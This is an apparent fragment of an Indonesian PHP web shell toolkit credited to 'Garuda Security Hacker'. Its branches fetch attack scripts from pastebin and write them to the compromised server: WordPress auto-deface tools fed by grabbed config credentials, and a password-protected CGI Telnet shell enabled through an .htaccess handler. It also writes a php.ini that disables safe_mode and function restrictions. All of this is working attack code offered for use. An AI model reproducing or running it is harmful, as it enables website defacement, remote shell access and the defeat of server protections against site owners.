		tool ini bisa untuk auto deface site berCMS Wordpress, sebelumnya ambil confignya dulu <a href="?xp=config_grabber_wp_jm" target="_blank">disini</a><br>
		video: <a href="https://youtu.be/tWEcMuiqKlo" target="_blank">tonton</a>';

	}
	elseif($xp == "pepes_wp2"){
	$pepes_wp2 = parah("http://pastebin.com/raw.php?i=4rZfJaqE", "pepes_wp2.php");
	
		$b = '<h2><a href="pepes_wp2.php" target="_blank">Auto Deface site cms Wordpress 2</a></h2><br>
		Tool ini ialah untuk auto Deface site berCMS Wordpress hanya dengan memasukan link config, sebelumnya ambil confignya dulu <a href="?xp=config_grabber_wp_jm" target="_blank">disini</a><br><br>*nb: ingat, masukan Link confignya<br>';

	}

	elseif($xp == "link_title"){
	$link_title = parah("http://pastebin.com/raw.php?i=u69dMjH9", "link_title.php");
	
		$b = '<h2><a href="link_title.php" target="_blank">Auto Deface site cms Wordpress 2</a></h2><br>
		Tool ini ialah untuk auto Deface site berCMS Wordpress hanya dengan memasukan link config, sebelumnya ambil confignya dulu <a href="?xp=config_grabber_wp_jm" target="_blank">disini</a><br><br>*nb: ingat, masukan Link confignya<br>';

	}

	elseif($xp == "cgi"){
	$dir = mkdir('cgi', 0777);
	$cgi = parah("http://pastebin.com/raw.php?i=XTUFfJLg", "cgi/anu.izo");
	
                $acces = "AddHandler cgi-script .izo";
				$frr2 = fopen('cgi/.htaccess', 'w');
				fwrite($frr2, $acces);
				chmod("cgi/anu.izo", 0755);

		
		$b = '<h2><a href="cgi/anu.izo" target="_blank">CGI Telnet</a></h2><br>
		password = indoXploit<br>it\' powerfull, source: <a href="http://www.rohitab.com/cgi-telnet" target="_blank">Rohitab.com</a>';

	}
	elseif($xp == "bypass"){
	$dir = getcwd();
	$isi = 'safe_mode = off
disable_functions = NONE
';
$buka = fopen($dir.'/php.ini', 'w');
fwrite($buka, $isi);
		
		$b = '<h2><a href="php.ini" target="_blank">Bypass Disabled Functions</a></h2><br>
		klik link tsb.';

	}

	
	
	echo '<!DOCTYPE html>

	</style>
</head>
<body>';

	echo "
</body>
</html>";
?>
<center>
<strong>@Copyright 2017 Garuda Security Hacker</strong>
</center>
